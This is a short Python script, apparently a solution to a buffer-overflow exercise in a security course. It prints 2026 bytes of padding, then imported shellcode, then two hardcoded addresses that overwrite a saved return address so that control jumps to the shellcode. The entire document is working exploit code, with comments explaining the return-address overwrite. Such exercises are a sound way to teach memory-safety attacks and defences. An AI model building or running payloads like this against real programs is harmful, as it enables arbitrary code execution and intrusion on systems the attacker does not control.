#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(b"a" * 2026)
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(pack("<I", 0xfffeab00))  # int a = top of char[2048] = shellcode
sys.stdout.buffer.write(pack("<I", 0xfffeb30c))  # int *p = &ret
# *p = a --> ret = shellcode
